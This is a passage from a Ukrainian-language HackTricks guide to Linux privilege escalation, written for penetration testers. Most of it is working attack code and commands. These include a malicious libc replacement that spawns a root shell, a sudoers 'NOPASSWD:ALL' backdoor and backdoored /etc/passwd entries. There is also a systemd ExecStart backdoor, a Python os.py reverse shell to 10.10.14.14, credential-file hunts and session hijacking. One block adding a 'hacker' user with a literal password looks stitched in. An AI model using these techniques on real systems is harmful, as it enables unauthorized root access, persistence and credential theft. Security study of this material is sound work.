Перегляньте **how to exploit this misconfiguration** на наступній сторінці:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Копіюючи бібліотеку в `/var/tmp/flag15/`, вона буде використана програмою саме в цьому місці, як вказано у змінній `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Потім створіть зловмисну бібліотеку в `/var/tmp` за допомогою `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Можливості

Linux capabilities надають процесу **підмножину доступних root-привілеїв**. Це фактично розділяє root **привілеї на менші й відмінні одиниці**. Кожну з цих одиниць можна потім окремо надавати процесам. Таким чином повний набір привілеїв зменшується, що знижує ризики експлуатації.\
Прочитайте наступну сторінку, щоб **дізнатися більше про можливості та як ними зловживати**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Права доступу до директорії

У директорії біт для **"execute"** означає, що відповідний користувач може **"cd"** у папку.\
Біт **"read"** означає, що користувач може **перелічувати** **файли**, а біт **"write"** означає, що користувач може **видаляти** та **створювати** нові **файли**.

## ACLs

Списки контролю доступу (ACLs) представляють вторинний шар дискреційних прав, здатний **перевизначати традиційні ugo/rwx права**. Ці права покращують контроль доступу до файлу або директорії, дозволяючи або забороняючи права конкретним користувачам, які не є власниками або не належать до групи. Такий рівень **гранулярності забезпечує більш точне управління доступом**. Подальші подробиці можна знайти [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Надайте** користувачу "kali" права читання та запису над файлом:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Отримати** файли з певними ACLs з системи:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Прихований ACL backdoor на sudoers drop-ins

Поширена помилка конфігурації — файл, власником якого є root, у `/etc/sudoers.d/` з режимом `440`, який усе одно надає користувачу з низькими привілеями доступ на запис через ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Якщо ви бачите щось на кшталт `user:alice:rw-`, користувач може додати правило sudo, незважаючи на обмежувальні бітові права:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Це високопотенційний шлях ACL persistence/privesc, оскільки його легко пропустити при переглядах, що обмежуються `ls -l`.

## Відкриті shell sessions

У **старих версіях** ви можете **hijack** деяку **shell** сесію іншого користувача (**root**).\
У **найновіших версіях** ви зможете **connect** лише до screen sessions свого власного користувача. Однак ви можете знайти **цікаву інформацію всередині session**.

### screen sessions hijacking

**Перелічити screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Приєднатися до сесії**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Перехоплення tmux сесій

Це була проблема зі **старими версіями tmux**. Мені не вдалося захопити tmux (v2.1) сесію, створену root, будучи непривілейованим користувачем.

**Перелік tmux сесій**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Приєднатися до сесії**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Всі SSL і SSH ключі, згенеровані на системах, заснованих на Debian (Ubuntu, Kubuntu, etc) між вереснем 2006 і 13 травня 2008 року можуть бути уражені цією вразливістю.\
Ця помилка виникає при створенні нового ssh ключа в цих OS, оскільки було можливих лише **32,768 варіантів**. Це означає, що всі варіанти можна обчислити й, маючи **ssh public key**, ви можете відшукати відповідний **private key**. Розраховані варіанти можна знайти тут: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Визначає, чи дозволена автентифікація паролем. За замовчуванням — `no`.
- **PubkeyAuthentication:** Визначає, чи дозволена автентифікація за публічним ключем. За замовчуванням — `yes`.
- **PermitEmptyPasswords**: Якщо дозволена автентифікація паролем, вказує, чи дозволяє сервер входи в акаунти з порожнім паролем. За замовчуванням — `no`.

### Login control files

Ці файли впливають на те, хто і як може увійти:

- **`/etc/nologin`**: якщо присутній, блокує входи не-root користувачів і виводить своє повідомлення.
- **`/etc/securetty`**: обмежує місця, звідки root може входити (TTY allowlist).
- **`/etc/motd`**: банер після входу (може leak інформацію про оточення або деталі обслуговування).

### PermitRootLogin

Визначає, чи може root входити через ssh, за замовчуванням — `no`. Можливі значення:

- `yes`: root може входити за допомогою пароля та private key
- `without-password` or `prohibit-password`: root може входити лише з private key
- `forced-commands-only`: root може входити лише за допомогою private key і тільки якщо вказані опції команд
- `no` : заборонено

### AuthorizedKeysFile

Вказує файли, що містять публічні ключі, які можуть бути використані для автентифікації користувача. Він може містити токени, такі як `%h`, які будуть замінені на домашній каталог. **Ви можете вказати абсолютні шляхи** (що починаються з `/`) або **відносні шляхи від домашнього каталогу користувача**. For example:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ця конфігурація вказуватиме, що якщо ви спробуєте увійти за допомогою **private** key користувача "**testusername**", ssh порівняє public key вашого ключа з тими, що знаходяться в `/home/testusername/.ssh/authorized_keys` та `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding дозволяє вам **use your local SSH keys instead of leaving keys** (without passphrases!) — не залишати ключі на сервері. Таким чином ви зможете **jump** via ssh **to a host**, а звідти **jump to another** host **using** the **key** що розташований на вашому **initial host**.

Вам потрібно встановити цю опцію в `$HOME/.ssh.config` ось так:
```
Host example.com
ForwardAgent yes
```
Зауважте, що якщо `Host` встановлено в `*`, то щоразу, коли користувач підключається до іншої машини, вона зможе отримати доступ до ключів (що є проблемою безпеки).

Файл `/etc/ssh_config` може **перевизначати** ці **опції** та дозволяти або забороняти цю конфігурацію.\
Файл `/etc/sshd_config` може **дозволяти** або **забороняти** переспрямування ssh-agent за допомогою ключового слова `AllowAgentForwarding` (за замовчуванням — дозволено).

Якщо ви виявили, що Forward Agent налаштовано в середовищі, прочитайте наступну сторінку, оскільки **ви можете зловживати цим для підвищення привілеїв**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Цікаві файли

### Файли профілів

Файл `/etc/profile` та файли в каталозі `/etc/profile.d/` — це **скрипти, які виконуються, коли користувач запускає нову оболонку**. Тому, якщо ви можете **записати або змінити будь-який із них, ви можете підвищити привілеї**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Якщо знайдено якийсь підозрілий профільний скрипт, його слід перевірити на наявність **чутливих даних**.

### Файли Passwd/Shadow

Залежно від ОС файли `/etc/passwd` та `/etc/shadow` можуть мати іншу назву або може існувати резервна копія. Тому рекомендовано **знайти всі** та **перевірити, чи можна їх прочитати**, щоб побачити, **чи є в файлах хеші**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
У деяких випадках ви можете знайти **password hashes** у файлі `/etc/passwd` (або еквівалентному).
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Файл /etc/passwd доступний для запису

Спочатку згенеруйте пароль однією з наступних команд.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
## Додавання користувача `hacker`

Щоб додати користувача та встановити згенерований пароль, виконайте:

```bash
sudo useradd -m -s /bin/bash hacker
echo '9fX$3bQk7Lp!z2R4' | sudo chpasswd
sudo chage -d 0 hacker
```

Згенерований пароль: `9fX$3bQk7Lp!z2R4`
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Наприклад: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Тепер ви можете використовувати команду `su` з `hacker:hacker`

Або ви можете використати наступні рядки для додавання фіктивного користувача без пароля.\
УВАГА: це може погіршити поточну безпеку машини.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
ПРИМІТКА: На платформах BSD `/etc/passwd` розташований у `/etc/pwd.db` та `/etc/master.passwd`, також `/etc/shadow` перейменовано на `/etc/spwd.db`.

Вам слід перевірити, чи можете ви **записувати в деякі чутливі файли**. Наприклад, чи можете ви записати в який-небудь **файл конфігурації служби**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Наприклад, якщо на машині працює сервер **tomcat** і ви можете **змінити файл конфігурації служби Tomcat всередині /etc/systemd/,** то ви можете змінити рядки:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Ваш backdoor виконається при наступному запуску tomcat.

### Перевірка папок

Наступні теки можуть містити резервні копії або цікаву інформацію: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Ймовірно, ви не зможете прочитати останню, але спробуйте)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Дивні розташування/Owned файли
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Змінені файли за останні хвилини
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB файли
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml файли
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Приховані файли
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Скрипти/Бінарні файли в PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Веб-файли**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Резервні копії**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Відомі файли, що містять паролі

Прочитайте код [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), він шукає **кілька можливих файлів, які можуть містити паролі**.\
**Ще один цікавий інструмент**, який ви можете використати для цього: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), який є програмою з відкритим вихідним кодом для витягання великої кількості паролів, збережених на локальному комп'ютері для Windows, Linux & Mac.

### Логи

Якщо ви можете читати логи, ви можете знайти в них **цікаву/конфіденційну інформацію**. Чим дивніший лог, тим цікавішим він буде (ймовірно).\
Також деякі **погано** налаштовані (backdoored?) **аудитні логи** можуть дозволити вам **записувати паролі** всередині аудитних логів, як пояснено в цій публікації: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Щоб читати логи, група [**adm**](interesting-groups-linux-pe/index.html#adm-group) буде дуже корисною.

### Shell файли
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Вам також слід перевіряти файли, що містять слово "**password**" у своєму **імені** або всередині **змісту**, а також шукати IPs і emails у logs або hashes regexps.\
Я не буду тут перелічувати, як робити все це, але якщо вам цікаво, можете переглянути останні перевірки, які виконує [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Файли, доступні для запису

### Python library hijacking

Якщо ви знаєте **звідки** буде виконуватися python script і ви **можете записувати всередині** тієї папки або можете **modify python libraries**, ви можете модифікувати бібліотеку os і backdoor її (якщо ви можете писати туди, де буде виконуватися python script, скопіюйте і вставте бібліотеку os.py).

Щоб **backdoor the library**, просто додайте в кінець бібліотеки os.py наступний рядок (змініть IP і PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Експлуатація logrotate

Уразливість у `logrotate` дозволяє користувачам з **правами запису** на файл логу або його батьківські директорії потенційно отримати підвищені привілеї. Це відбувається тому, що `logrotate`, який часто працює як **root**, можна змусити виконати довільні файли, особливо в директоріях на кшталт _**/etc/bash_completion.d/**_. Важливо перевіряти права не лише в _/var/log_, а й у будь-якій директорії, де застосовується ротація логів.

> [!TIP]
> Ця вразливість стосується `logrotate` версії `3.18.0` і старіших

Більш детальну інформацію про вразливість можна знайти на цій сторінці: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Цю вразливість можна експлуатувати за допомогою [**logrotten**](https://github.com/whotwagner/logrotten).

Ця вразливість дуже схожа на [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** тож коли ви виявите, що можете змінювати логи, перевірте, хто ними керує, і чи можна підняти привілеї, замінивши логи на symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

Якщо з якоїсь причини користувач може **записати** скрипт `ifcf-<whatever>` у _/etc/sysconfig/network-scripts_ **або** може **відкоригувати** існуючий — то ваша **system is pwned**.

Network scripts, _ifcg-eth0_ наприклад, використовуються для мережевих з'єднань. Вони виглядають точно як .INI файли. Однак вони \~sourced\~ у Linux Network Manager (dispatcher.d).

У моєму випадку атрибут `NAME=` у цих network scripts обробляється некоректно. Якщо в імені є **white/blank space в імені система намагається виконати частину після white/blank space**. Це означає, що **все після першого пробілу виконується як root**.

Наприклад: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
(_Зверніть увагу на пробіл між Network та /bin/id_)

### **init, init.d, systemd, and rc.d**

Директорія `/etc/init.d` містить **скрипти** для System V init (SysVinit), **класичної системи керування сервісами Linux**. Вони включають скрипти для `start`, `stop`, `restart`, а інколи й `reload` сервісів. Ці скрипти можна виконувати безпосередньо або через символічні посилання, що знаходяться в `/etc/rc?.d/`. Альтернативний шлях в системах Redhat — `/etc/rc.d/init.d`.

Натомість `/etc/init` пов'язаний з **Upstart**, новішою системою **керування сервісами**, запровадженою в Ubuntu, яка використовує конфігураційні файли для управління сервісами. Незважаючи на перехід до Upstart, скрипти SysVinit все ще використовуються поряд з конфігураціями Upstart завдяки шару сумісності в Upstart.

**systemd** постає як сучасний менеджер ініціалізації та сервісів, пропонуючи розширені можливості, такі як on-demand запуск демонів, управління automount та знімки стану системи. Він організовує файли в `/usr/lib/systemd/` для пакетів дистрибутива та в `/etc/systemd/system/` для змін адміністратора, спрощуючи адміністрування системи.

## Інші хитрощі

### NFS Privilege escalation


{{#ref}}
nfs-no_root_squash-misconfiguration-pe.md
{{#endref}}

### Escaping from restricted Shells


{{#ref}}
escaping-from-limited-bash.md
{{#endref}}

### Cisco - vmanage


{{#ref}}
cisco-vmanage.md
{{#endref}}

## Android rooting frameworks: manager-channel abuse

Android rooting frameworks зазвичай хукaють syscall, щоб відкрити привілейований функціонал ядра для userspace manager. Слабка аутентифікація manager (наприклад, перевірки підпису, що базуються на порядку FD, або погані схеми паролів) може дозволити локальному додатку видавати себе за manager та підвищити права до root на вже прорутованих пристроях. Детальніше та техніки експлуатації тут:


{{#ref}}
android-rooting-frameworks-manager-auth-bypass-syscall-hook.md
{{#endref}}

## VMware Tools service discovery LPE (CWE-426) via regex-based exec (CVE-2025-41244)

Regex-керована service discovery в VMware Tools/Aria Operations може витягти шлях до бінарника з командного рядка процесу і виконати його з `-v` у привілейованому контексті. Пермісивні патерни (наприклад, використання \S) можуть співпасти з розміщеними атаками прослуховувачами в записуваних локаціях (наприклад, /tmp/httpd), що призводить до виконання від імені root (CWE-426 Untrusted Search Path).

Детальніше і загальний патерн, застосовний до інших стеків discovery/monitoring, тут:

{{#ref}}
vmware-tools-service-discovery-untrusted-search-path-cve-2025-41244.md
{{#endref}}

## Захисні механізми ядра

- [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
- [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Більше допомоги

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Linux/Unix Privesc Tools

### **Best tool to look for Linux local privilege escalation vectors:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
**BeeRoot:** [https://github.com/AlessandroZ/BeRoot/tree/master/Linux](https://github.com/AlessandroZ/BeRoot/tree/master/Linux)\
**Kernelpop:** Enumerate kernel vulns ins linux and MAC [https://github.com/spencerdodd/kernelpop](https://github.com/spencerdodd/kernelpop)\
**Mestaploit:** _**multi/recon/local_exploit_suggester**_\
**Linux Exploit Suggester:** [https://github.com/mzet-/linux-exploit-suggester](https://github.com/mzet-/linux-exploit-suggester)\
**EvilAbigail (physical access):** [https://github.com/GDSSecurity/EvilAbigail](https://github.com/GDSSecurity/EvilAbigail)\
**Recopilation of more scripts**: [https://github.com/1N3/PrivEsc](https://github.com/1N3/PrivEsc)

## Джерела

- [0xdf – HTB Planning (Crontab UI privesc, zip -P creds reuse)](https://0xdf.gitlab.io/2025/09/13/htb-planning.html)
- [0xdf – HTB Era: forged .text_sig payload for cron-executed monitor](https://0xdf.gitlab.io/2025/11/29/htb-era.html)
- [0xdf – Holiday Hack Challenge 2025: Neighborhood Watch Bypass (sudo env_keep PATH hijack)](https://0xdf.gitlab.io/holidayhack2025/act1/neighborhood-watch)
- [alseambusher/crontab-ui](https://github.com/alseambusher/crontab-ui)
- [https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)
- [https://payatu.com/guide-linux-privilege-escalation/](https://payatu.com/guide-linux-privilege-escalation/)
- [https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744](https://pen-testing.sans.org/resources/papers/gcih/attack-defend-linux-privilege-escalation-techniques-2016-152744)
- [http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html](http://0x90909090.blogspot.com/2015/07/no-one-expect-command-execution.html)
- [https://touhidshaikh.com/blog/?p=827](https://touhidshaikh.com/blog/?p=827)
- [https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf](https://github.com/sagishahar/lpeworkshop/blob/master/Lab%20Exercises%20Walkthrough%20-%20Linux.pdf)
- [https://github.com/frizb/Linux-Privilege-Escalation](https://github.com/frizb/Linux-Privilege-Escalation)
- [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits)
- [https://github.com/rtcrowley/linux-private-i](https://github.com/rtcrowley/linux-private-i)
- [https://www.linux.com/news/what-socket/](https://www.linux.com/news/what-socket/)
- [https://muzec0318.github.io/posts/PG/peppo.html](https://muzec0318.github.io/posts/PG/peppo.html)
- [https://www.linuxjournal.com/article/7744](https://www.linuxjournal.com/article/7744)
- [https://blog.certcube.com/suid-executables-linux-privilege-escalation/](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [https://juggernaut-sec.com/sudo-part-2-lpe](https://juggernaut-sec.com/sudo-part-2-lpe)
- [https://linuxconfig.org/how-to-manage-acls-on-linux](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [https://www.linode.com/docs/guides/what-is-systemd/](https://www.linode.com/docs/guides/what-is-systemd/)
- [0xdf – HTB Eureka (bash arithmetic injection via logs, overall chain)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [GNU Bash Manual – BASH_ENV (non-interactive startup file)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink privesc)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [0xdf – HTB Slonik (pg_basebackup cron copy → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [NVISO – You name it, VMware elevates it (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)

{{#include ../../banners/hacktricks-training.md}}
